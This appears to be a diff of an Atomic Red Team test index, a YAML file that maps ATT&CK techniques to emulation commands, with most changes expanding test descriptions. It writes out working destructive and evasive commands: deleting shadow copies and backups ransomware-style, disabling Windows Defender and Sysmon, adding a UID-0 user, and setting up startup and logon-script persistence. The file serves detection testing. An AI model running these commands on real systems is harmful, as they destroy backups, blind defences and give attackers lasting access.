@@ -614,11 +614,8 @@ persistence:
     atomic_tests:
     - name: Application Shim Installation
       description: |
-        To test injecting DLL into a custom application
-        you need to copy AtomicShim.dll Into C:\Tools
-        As well as Compile the custom app.
-        We believe observing the shim install is a good
-        place to start.
+        Install a shim database. This technique is used for privelage escalation and bypassing user access control. Upon execution, "Installation of AtomicShim complete."
+        will be displayed.
       supported_platforms:
       - windows
       input_arguments:
@@ -636,13 +633,17 @@ persistence:
       executor:
         name: command_prompt
         elevation_required: true
-        command: |
-          sdbinst.exe #{file_path}
-          sdbinst.exe -u #{file_path}
-    - name: New shim database files created in the default shim database directory
-      description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
+        command: 'sdbinst.exe #{file_path}
 
 '
+        cleanup_command: 'sdbinst.exe -u #{file_path}
+
+'
+    - name: New shim database files created in the default shim database directory
+      description: |
+        Upon execution, check the "C:\Windows\apppatch\Custom\" folder for the new shim database
+
+        https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
       supported_platforms:
       - windows
       executor:
@@ -655,9 +656,11 @@ persistence:
           Remove-Item C:\Windows\apppatch\Custom\T1138CompatDatabase.sdb -ErrorAction Ignore
           Remove-Item C:\Windows\apppatch\Custom\Custom64\T1138CompatDatabase.sdb -ErrorAction Ignore
     - name: Registry key creation and/or modification events for SDB
-      description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
+      description: |
+        Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing
+        the registry keys that were created. These keys can also be viewed using the Registry Editor.
 
-'
+        https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
       supported_platforms:
       - windows
       executor:
@@ -1174,9 +1177,9 @@ persistence:
 
 '
     - name: Create a new user in a command prompt
-      description: 'Creates a new user in a command prompt
-
-'
+      description: |
+        Creates a new user in a command prompt. Upon execution, "The command completed successfully." will be displayed. To verify the
+        new account, run "net user" in powershell or CMD and observe that there is a new user named "T1136_CMD"
       supported_platforms:
       - windows
       input_arguments:
@@ -1198,9 +1201,9 @@ persistence:
 
 '
     - name: Create a new user in PowerShell
-      description: 'Creates a new user in PowerShell
-
-'
+      description: |
+        Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the
+        new account, run "net user" in powershell or CMD and observe that there is a new user named "T1136_PowerShell"
       supported_platforms:
       - windows
       input_arguments:
@@ -1239,7 +1242,9 @@ persistence:
         command: |
           useradd -o -u 0 -g 0 -M -d /root -s /bin/bash #{username}
           echo "#{password}" | passwd --stdin #{username}
-        cleanup_command: 'userdel #{username}'
+        cleanup_command: 'userdel #{username}
+
+'
   T1038:
     technique:
       x_mitre_permissions_required:
@@ -2753,17 +2758,16 @@ persistence:
       identifier: T1037
     atomic_tests:
     - name: Logon Scripts
-      description: 'Adds a registry value to run batch script created in the C:\Windows\Temp
-        directory.
-
-'
+      description: |
+        Adds a registry value to run batch script created in the %temp% directory. Upon execution, there will be a new environment variable in the HKCU\Environment key
+        that can be viewed in the Registry Editor.
       supported_platforms:
       - windows
       input_arguments:
         script_path:
           description: Path to .bat file
           type: String
-          default: "$env:SystemRoot\\Temp\\art.bat"
+          default: "%temp%\\art.bat"
         script_command:
           description: Command To Execute
           type: String
@@ -2772,16 +2776,16 @@ persistence:
         name: command_prompt
         elevation_required: false
         command: |
-          echo cmd /c "#{script_command}" > #{script_path}
-          REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "#{script_path}"
+          echo "#{script_command}" > #{script_path}
+          REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "#{script_path}" /f
         cleanup_command: |
           REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f
-          del #{script_path} >nul 2>nul
-          del "%USERPROFILE%\desktop\T1037-log.txt" >nul 2>nul
+          del #{script_path} >nul 2>&1
+          del "%USERPROFILE%\desktop\T1037-log.txt" >nul 2>&1
     - name: Scheduled Task Startup Script
-      description: 'Run an exe on user logon or system startup
-
-'
+      description: |
+        Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view
+        the tasks, open the Task Scheduler and look in the Active Tasks pane.
       supported_platforms:
       - windows
       executor:
@@ -2809,10 +2813,11 @@ persistence:
           Populate the plist with the location of your shell script\n\n\t  defaults
           write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh\n"
     - name: Supicious vbs file run from startup Folder
-      description: 'vbs files can be placed in and ran from the startup folder to
-        maintain persistance
-
-'
+      description: "vbs files can be placed in and ran from the startup folder to
+        maintain persistance. Upon execution, \"T1137 Hello, World VBS!\" will be
+        displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start
+        Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted
+        and the user logs in.\n"
       supported_platforms:
       - windows
       executor:
@@ -2827,9 +2832,11 @@ persistence:
           Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs" -ErrorAction Ignore
           Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs" -ErrorAction Ignore
     - name: Supicious jse file run from startup Folder
-      description: |
-        jse files can be placed in and ran from the startup folder to maintain persistance.
-        Upon execution, "T1137 Hello, World JSE!" will be printed to the powershell session twice.
+      description: "jse files can be placed in and ran from the startup folder to
+        maintain persistance.\nUpon execution, \"T1137 Hello, World JSE!\" will be
+        displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start
+        Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted
+        and the user logs in.\n"
       supported_platforms:
       - windows
       executor:
@@ -2846,7 +2853,8 @@ persistence:
     - name: Supicious bat file run from startup Folder
       description: |
         bat files can be placed in and executed from the startup folder to maintain persistance.
-        Upon execution, cmd will be run and immediately closed.
+        Upon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+        folder and will also run when the computer is restarted and the user logs in.
       supported_platforms:
       - windows
       executor:
@@ -6916,10 +6924,9 @@ defense-evasion:
 
 '
     - name: Unload Sysmon Filter Driver
-      description: 'Unloads the Sysinternals Sysmon filter driver without stopping
-        the Sysmon service.
-
-'
+      description: |
+        Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,
+        run the prereq_command's and it should fail with an error of "sysmon filter must be loaded".
       supported_platforms:
       - windows
       input_arguments:
@@ -6928,11 +6935,28 @@ defense-evasion:
             the default)
           type: string
           default: SysmonDrv
+      dependency_executor_name: powershell
       dependencies:
-      - description: Sysmon filter must be loaded
-        prereq_command: 'fltmc.exe filters | findstr #{sysmon_driver}'
-        get_prereq_command: echo Automated installer not implemented yet, please install
-          Sysmon manually
+      - description: Sysmon must be downloaded
+        prereq_command: if ((cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon
+          2> nul") -or (Test-Path $env:Temp\Sysmon\Sysmon.exe)) { exit 0 } else {
+          exit 1 }
+        get_prereq_command: |-
+          Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
+          Expand-Archive $env:TEMP\Sysmon.zip $env:TEMP\Sysmon -Force
+          Remove-Item $env:TEMP\Sysmon.zip -Force
+      - description: sysmon must be Installed
+        prereq_command: if(sc.exe query sysmon | findstr sysmon) { exit 0 } else {
+          exit 1 }
+        get_prereq_command: |-
+          if(cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") { C:\Windows\Sysmon.exe -accepteula -i } else
+          { Set-Location $env:TEMP\Sysmon\; .\Sysmon.exe -accepteula -i}
+      - description: sysmon filter must be loaded
+        prereq_command: 'if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0
+          } else { exit 1 }'
+        get_prereq_command: |-
+          sysmon -u
+          sysmon -accepteula -i
       executor:
         name: command_prompt
         elevation_required: true
@@ -6943,9 +6967,10 @@ defense-evasion:
 
 '
         cleanup_command: |
-          sc stop sysmon
-          fltmc.exe load #{sysmon_driver}
-          sc start sysmon
+          sysmon -u -i > nul 2>&1
+          sysmon -i -accepteula -i > nul 2>&1
+          %temp%\Sysmon\sysmon.exe -u > nul 2>&1
+          %temp%\Sysmon\sysmon.exe -accepteula -i > nul 2>&1
     - name: Disable Windows IIS HTTP Logging
       description: |
         Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).
@@ -7088,10 +7113,9 @@ defense-evasion:
 
 '
     - name: Tamper with Windows Defender ATP PowerShell
-      description: 'Attempting to disable scheduled scanning and other parts of windows
-        defender atp
-
-'
+      description: |
+        Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled
+        in Windows settings.
       supported_platforms:
       - windows
       executor:
@@ -7108,10 +7132,9 @@ defense-evasion:
           Set-MpPreference -DisableScriptScanning 0
           Set-MpPreference -DisableBlockAtFirstSeen 0
     - name: Tamper with Windows Defender Command Prompt
-      description: 'Attempting to disable scheduled scanning and other parts of windows
-        defender atp
-
-'
+      description: |
+        Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.
+        However, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on.
       supported_platforms:
       - windows
       executor:
@@ -7125,9 +7148,9 @@ defense-evasion:
           sc start WinDefend
           sc config WinDefend start=enabled
     - name: Tamper with Windows Defender Registry
-      description: 'Disable Windows Defender from starting after a reboot
-
-'
+      description: |
+        Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be
+        grayed out and have no info.
       supported_platforms:
       - windows
       executor:
@@ -7143,7 +7166,10 @@ defense-evasion:
 '
     - name: Disable Microft Office Security Features
       description: |
-        Gorgon group may disable Office security features so that their code can run
+        Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not
+        show any warning before editing the document
+
+
         https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
       supported_platforms:
       - windows
@@ -7163,8 +7189,10 @@ defense-evasion:
           Remove-Item -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView"
     - name: Remove Windows Defender Definition Files
       description: |
-        Removing definition files would cause ATP to not fire for AntiMalware
-        Check MpCmdRun.exe man page for info on all arguments
+        Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.
+        On later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the
+        command will say completed.
+
         https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/
       supported_platforms:
       - windows
@@ -13425,11 +13453,8 @@ privilege-escalation:
     atomic_tests:
     - name: Application Shim Installation
       description: |
-        To test injecting DLL into a custom application
-        you need to copy AtomicShim.dll Into C:\Tools
-        As well as Compile the custom app.
-        We believe observing the shim install is a good
-        place to start.
+        Install a shim database. This technique is used for privelage escalation and bypassing user access control. Upon execution, "Installation of AtomicShim complete."
+        will be displayed.
       supported_platforms:
       - windows
       input_arguments:
@@ -13447,13 +13472,17 @@ privilege-escalation:
       executor:
         name: command_prompt
         elevation_required: true
-        command: |
-          sdbinst.exe #{file_path}
-          sdbinst.exe -u #{file_path}
-    - name: New shim database files created in the default shim database directory
-      description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
+        command: 'sdbinst.exe #{file_path}
 
 '
+        cleanup_command: 'sdbinst.exe -u #{file_path}
+
+'
+    - name: New shim database files created in the default shim database directory
+      description: |
+        Upon execution, check the "C:\Windows\apppatch\Custom\" folder for the new shim database
+
+        https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
       supported_platforms:
       - windows
       executor:
@@ -13466,9 +13495,11 @@ privilege-escalation:
           Remove-Item C:\Windows\apppatch\Custom\T1138CompatDatabase.sdb -ErrorAction Ignore
           Remove-Item C:\Windows\apppatch\Custom\Custom64\T1138CompatDatabase.sdb -ErrorAction Ignore
     - name: Registry key creation and/or modification events for SDB
-      description: 'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
+      description: |
+        Create registry keys in locations where fin7 typically places SDB patches. Upon execution, output will be displayed describing
+        the registry keys that were created. These keys can also be viewed using the Registry Editor.
 
-'
+        https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html
       supported_platforms:
       - windows
       executor:
@@ -15951,73 +15982,39 @@ impact:
       modified: '2019-07-19T14:34:28.595Z'
       identifier: T1485
     atomic_tests:
-    - name: Windows - Delete Volume Shadow Copies
-      description: 'Deletes Windows Volume Shadow Copies. This technique is used by
-        numerous ransomware families and APT malware such as Olympic Destroyer.
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: command_prompt
-        elevation_required: true
-        command: 'vssadmin.exe delete shadows /all /quiet
-
-'
-    - name: Windows - Delete Windows Backup Catalog
-      description: 'Deletes Windows Backup Catalog. This technique is used by numerous
-        ransomware families and APT malware such as Olympic Destroyer.
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: command_prompt
-        elevation_required: true
-        command: 'wbadmin.exe delete catalog -quiet
-
-'
-    - name: Windows - Disable Windows Recovery Console Repair
-      description: |
-        Disables repair by the Windows Recovery Console on boot.
-        This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
-      supported_platforms:
-      - windows
-      executor:
-        name: command_prompt
-        elevation_required: true
-        command: |
-          bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
-          bcdedit.exe /set {default} recoveryenabled no
-        cleanup_command: |
-          bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures
-          bcdedit.exe /set {default} recoveryenabled yes
     - name: Windows - Overwrite file with Sysinternals SDelete
       description: |
-        Overwrites and deletes a file using Sysinternals SDelete.
-        Requires the download of either Sysinternals Suite or the individual SDelete utility.
+        Overwrites and deletes a file using Sysinternals SDelete. Upon successful execution, "Files deleted: 1" will be displayed in
+        the powershell session along with other information about the file that was deleted.
       supported_platforms:
       - windows
       input_arguments:
         sdelete_exe:
           description: Path of sdelete executable
           type: Path
-          default: PathToAtomicsFolder\T1485\bin\sdelete.exe
+          default: "$env:TEMP\\Sdelete\\sdelete.exe"
+        file_to_delete:
+          description: Path of file to delete
+          type: path
+          default: "$env:TEMP\\T1485.txt"
       dependency_executor_name: powershell
       dependencies:
       - description: Secure delete tool from Sysinternals must exist on disk at specified
           location (#{sdelete_exe})
-        prereq_command: 'if (Test-Path #{sdelete_exe}) {0} else {1}'
+        prereq_command: 'if (Test-Path #{sdelete_exe}) {exit 0} else {exit 1}'
         get_prereq_command: |-
           Invoke-WebRequest "https://download.sysinternals.com/files/SDelete.zip" -OutFile "$env:TEMP\SDelete.zip"
           Expand-Archive $env:TEMP\SDelete.zip $env:TEMP\Sdelete -Force
-          New-Item -ItemType Directory (Split-Path "#{sdelete_exe}") -Force | Out-Null
-          Copy-Item $env:TEMP\Sdelete\sdelete.exe "#{sdelete_exe}" -Force
+          Remove-Item $env:TEMP\SDelete.zip -Force
+      - description: 'The file to delete must exist at #{file_to_delete}'
+        prereq_command: 'if (Test-Path #{file_to_delete}) { exit 0 } else { exit 1
+          }'
+        get_prereq_command: 'New-Item #{file_to_delete} -Force | Out-Null'
       executor:
         name: powershell
-        command: |
-          New-Item $env:TEMP\T1485.txt
-          #{sdelete_exe} -accepteula $env:TEMP\T1485.txt
+        command: 'Invoke-Expression -Command "#{sdelete_exe} -accepteula #{file_to_delete}"
+
+'
     - name: macOS/Linux - Overwrite file with DD
       description: |
         Overwrites and deletes a file using DD.
@@ -16037,19 +16034,6 @@ impact:
       executor:
         name: bash
         command: 'dd of=#{file_to_overwrite} if=#{overwrite_source}
-
-'
-    - name: Windows - Delete Backup Files
-      description: 'Deletes backup files in a manner similar to Ryuk ransomware.
-
-'
-      supported_platforms:
-      - windows
-      executor:
-        name: command_prompt
-        elevation_required: true
-        command: 'del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.*
-          c:\backup*.* c:\*.set c:\*.win c:\*.dsk >nul 2>&1
 
 '
   '':
@@ -16172,12 +16156,22 @@ impact:
       identifier: T1490
     atomic_tests:
     - name: Windows - Delete Volume Shadow Copies
-      description: 'Deletes Windows Volume Shadow Copies. This technique is used by
-        numerous ransomware families and APT malware such as Olympic Destroyer.
+      description: |
+        Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon
+        execution, if no shadow volumes exist the message "No items found that satisfy the query." will be displayed. If shadow volumes are present, it
+        will delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n
+        confirmation prompt. Shadow copies can only be created on Windows server or Windows 8.
 
-'
+        https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)
       supported_platforms:
       - windows
+      dependency_executor_name: powershell
+      dependencies:
+      - description: Create volume shadow copy of C:\ . This prereq command only works
+          on Windows Server or Windows 8.
+        prereq_command: if(!(vssadmin.exe list shadows | findstr "No items found that
+          satisfy the query.")) { exit 0 } else { exit 1 }
+        get_prereq_command: 'vssadmin.exe create shadow /for=c:'
       executor:
         name: command_prompt
         elevation_required: true
@@ -16185,10 +16179,9 @@ impact:
 
 '
     - name: Windows - Delete Volume Shadow Copies via WMI
-      description: 'Deletes Windows Volume Shadow Copies via WMI. This technique is
-        used by numerous ransomware families and APT malware such as Olympic Destroyer.
-
-'
+      description: |
+        Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
+        Shadow copies can only be created on Windows server or Windows 8.
       supported_platforms:
       - windows
       executor:
@@ -16198,10 +16191,9 @@ impact:
 
 '
     - name: Windows - Delete Windows Backup Catalog
-      description: 'Deletes Windows Backup Catalog. This technique is used by numerous
-        ransomware families and APT malware such as Olympic Destroyer.
-
-'
+      description: |
+        Deletes Windows Backup Catalog. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon execution,
+        "The backup catalog has been successfully deleted." will be displayed in the PowerShell session.
       supported_platforms:
       - windows
       executor:
@@ -16211,9 +16203,9 @@ impact:
 
 '
     - name: Windows - Disable Windows Recovery Console Repair
-      description: "Disables repair by the Windows Recovery Console on boot. \nThis
-        technique is used by numerous ransomware families and APT malware such as
-        Olympic Destroyer.\n"
+      description: |
+        Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.
+        Upon execution, "The operation completed successfully." will be displayed in the powershell session.
       supported_platforms:
       - windows
       executor:
@@ -16222,17 +16214,34 @@ impact:
         command: |
           bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
           bcdedit.exe /set {default} recoveryenabled no
+        cleanup_command: |
+          bcdedit.exe /set {default} bootstatuspolicy DisplayAllFailures
+          bcdedit.exe /set {default} recoveryenabled yes
     - name: Windows - Delete Volume Shadow Copies via WMI with PowerShell
-      description: "Deletes Windows Volume Shadow Copies with PowerShell code and
-        Get-WMIObject. \nThis technique is used by numerous ransomware families such
-        as Sodinokibi/REvil.\nExecutes Get-WMIObject \n"
+      description: |
+        Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.
+        This technique is used by numerous ransomware families such as Sodinokibi/REvil.
+        Executes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution
+        there may be no output displayed.
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        elevation_required: true
+        command: 'Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}
+
+'
+    - name: Windows - Delete Backup Files
+      description: |
+        Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many "access is denied" messages will appear as the commands try
+        to delete files from around the system.
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         elevation_required: true
-        command: 'powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | ForEach-Object
-          {$_.Delete();}"
+        command: 'del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.*
+          c:\backup*.* c:\*.set c:\*.win c:\*.dsk
 
 '
   T1496:
@@ -16380,9 +16389,10 @@ impact:
       identifier: T1489
     atomic_tests:
     - name: Windows - Stop service using Service Controller
-      description: 'Stops a specified service using the sc.exe command.
-
-'
+      description: |
+        Stops a specified service using the sc.exe command. Upon execution, if the spooler service was running infomration will be displayed saying
+        it has changed to a state of STOP_PENDING. If the spooler service was not running "The service has not been started." will be displayed and it can be
+        started by running the cleanup command.
       supported_platforms:
       - windows
       input_arguments:
@@ -16400,9 +16410,10 @@ impact:
 
 '
     - name: Windows - Stop service using net.exe
-      description: 'Stops a specified service using the net.exe command.
-
-'
+      description: |
+        Stops a specified service using the net.exe command. Upon execution, if the service was running "The Print Spooler service was stopped successfully."
+        will be displayed. If the service was not running, "The Print Spooler service is not started." will be displayed and it can be
+        started by running the cleanup command.
       supported_platforms:
       - windows
       input_arguments:
@@ -16420,8 +16431,11 @@ impact:
 
 '
     - name: Windows - Stop service by killing process
-      description: "Stops a specified service killng the service's process. \nThis
-        technique was used by WannaCry.\n"
+      description: |
+        Stops a specified service killng the service's process.
+        This technique was used by WannaCry. Upon execution, if the spoolsv service was running "SUCCESS: The process "spoolsv.exe" with PID 2316 has been terminated."
+        will be displayed. If the service was not running "ERROR: The process "spoolsv.exe" not found." will be displayed and it can be
+        started by running the cleanup command.
       supported_platforms:
       - windows
       input_arguments:
@@ -17997,9 +18011,9 @@ discovery:
           dscl . -list /Groups
           groups
     - name: Basic Permission Groups Discovery Windows
-      description: 'Basic Permission Groups Discovery for Windows
-
-'
+      description: |
+        Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
+        information will be displayed.
       supported_platforms:
       - windows
       executor:
@@ -18010,9 +18024,9 @@ discovery:
           net group /domain
           net group "domain admins" /domain
     - name: Permission Groups Discovery PowerShell
-      description: 'Permission Groups Discovery utilizing PowerShell
-
-'
+      description: |
+        Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
+        information will be displayed.
       supported_platforms:
       - windows
       input_arguments:
@@ -18027,10 +18041,9 @@ discovery:
           get-localgroup
           get-ADPrincipalGroupMembership #{user} | select name
     - name: Elevated group enumeration using net group
-      description: 'Runs "net group" command including command aliases and loose typing
-        to simulate enumeration/discovery of high value domain groups
-
-'
+      description: |
+        Runs "net group" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This
+        test will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.
       supported_platforms:
       - windows
       executor:
@@ -19245,7 +19258,8 @@ discovery:
       identifier: T1124
     atomic_tests:
     - name: System Time Discovery
-      description: 'Identify the system time
+      description: 'Identify the system time. Upon execution, the local computer system
+        time and timezone will be displayed.
 
 '
       supported_platforms:
@@ -19262,7 +19276,8 @@ discovery:
           net time \\#{computer_name}
           w32tm /tz
     - name: System Time Discovery - PowerShell
-      description: 'Identify the system time via PowerShell
+      description: 'Identify the system time via PowerShell. Upon execution, the system
+        time will be displayed.
 
 '
       supported_platforms:
@@ -25847,17 +25862,16 @@ lateral-movement:
       identifier: T1037
     atomic_tests:
     - name: Logon Scripts
-      description: 'Adds a registry value to run batch script created in the C:\Windows\Temp
-        directory.
-
-'
+      description: |
+        Adds a registry value to run batch script created in the %temp% directory. Upon execution, there will be a new environment variable in the HKCU\Environment key
+        that can be viewed in the Registry Editor.
       supported_platforms:
       - windows
       input_arguments:
         script_path:
           description: Path to .bat file
           type: String
-          default: "$env:SystemRoot\\Temp\\art.bat"
+          default: "%temp%\\art.bat"
         script_command:
           description: Command To Execute
           type: String
@@ -25866,16 +25880,16 @@ lateral-movement:
         name: command_prompt
         elevation_required: false
         command: |
-          echo cmd /c "#{script_command}" > #{script_path}
-          REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "#{script_path}"
+          echo "#{script_command}" > #{script_path}
+          REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "#{script_path}" /f
         cleanup_command: |
           REG.exe DELETE HKCU\Environment /v UserInitMprLogonScript /f
-          del #{script_path} >nul 2>nul
-          del "%USERPROFILE%\desktop\T1037-log.txt" >nul 2>nul
+          del #{script_path} >nul 2>&1
+          del "%USERPROFILE%\desktop\T1037-log.txt" >nul 2>&1
     - name: Scheduled Task Startup Script
-      description: 'Run an exe on user logon or system startup
-
-'
+      description: |
+        Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view
+        the tasks, open the Task Scheduler and look in the Active Tasks pane.
       supported_platforms:
       - windows
       executor:
@@ -25903,10 +25917,11 @@ lateral-movement:
           Populate the plist with the location of your shell script\n\n\t  defaults
           write com.apple.loginwindow LoginHook /Library/Scripts/AtomicRedTeam.sh\n"
     - name: Supicious vbs file run from startup Folder
-      description: 'vbs files can be placed in and ran from the startup folder to
-        maintain persistance
-
-'
+      description: "vbs files can be placed in and ran from the startup folder to
+        maintain persistance. Upon execution, \"T1137 Hello, World VBS!\" will be
+        displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start
+        Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted
+        and the user logs in.\n"
       supported_platforms:
       - windows
       executor:
@@ -25921,9 +25936,11 @@ lateral-movement:
           Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs" -ErrorAction Ignore
           Remove-Item "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs" -ErrorAction Ignore
     - name: Supicious jse file run from startup Folder
-      description: |
-        jse files can be placed in and ran from the startup folder to maintain persistance.
-        Upon execution, "T1137 Hello, World JSE!" will be printed to the powershell session twice.
+      description: "jse files can be placed in and ran from the startup folder to
+        maintain persistance.\nUpon execution, \"T1137 Hello, World JSE!\" will be
+        displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start
+        Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted
+        and the user logs in.\n"
       supported_platforms:
       - windows
       executor:
@@ -25940,7 +25957,8 @@ lateral-movement:
     - name: Supicious bat file run from startup Folder
       description: |
         bat files can be placed in and executed from the startup folder to maintain persistance.
-        Upon execution, cmd will be run and immediately closed.
+        Upon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+        folder and will also run when the computer is restarted and the user logs in.
       supported_platforms:
       - windows
       executor:
@@ -27083,33 +27101,40 @@ collection:
       identifier: T1119
     atomic_tests:
     - name: Automated Collection Command Prompt
-      description: 'Automated Collection
-
-'
+      description: |
+        Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection
+        to see what was collected.
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         command: |
+          mkdir %temp%\T1119_command_prompt_collection >nul 2>&1
           dir c: /b /s .docx | findstr /e .docx
-          for /R c: %f in (*.docx) do copy %f c:\temp\
-    - name: Automated Collection PowerShell
-      description: 'Automated Collection
+          for /R c: %f in (*.docx) do copy %f %temp%\T1119_command_prompt_collection
+        cleanup_command: 'del %temp%\T1119_command_prompt_collection /F /Q >null 2>&1
 
 '
+    - name: Automated Collection PowerShell
+      description: |
+        Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection
+        to see what was collected.
       supported_platforms:
       - windows
       executor:
         name: powershell
         elevation_required: false
-        command: 'Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName
-          -destination c:\temp}
+        command: |
+          New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null
+          Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}
+        cleanup_command: 'Remove-Item $env:TEMP\T1119_powershell_collection -Force
+          | Out-Null
 
 '
     - name: Recon information for export with PowerShell
-      description: 'collect information for exfiltration
-
-'
+      description: |
+        collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt
+        to see what was collected.
       supported_platforms:
       - windows
       executor:
@@ -27124,9 +27149,9 @@ collection:
           Remove-Item $env:TEMP\T1119_2.txt -ErrorAction Ignore
           Remove-Item $env:TEMP\T1119_3.txt -ErrorAction Ignore
     - name: Recon information for export with Command Prompt
-      description: 'collect information for exfiltration
-
-'
+      description: |
+        collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt
+        to see what was collected.
       supported_platforms:
       - windows
       executor:
@@ -27137,7 +27162,7 @@ collection:
           doskey /history > %TEMP%\T1119_2.txt
           wmic process list > %TEMP%\T1119_3.txt
           tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt
-        cleanup_command: |-
+        cleanup_command: |
           del %TEMP%\T1119_1.txt >nul 2>&1
           del %TEMP%\T1119_2.txt >nul 2>&1
           del %TEMP%\T1119_3.txt >nul 2>&1
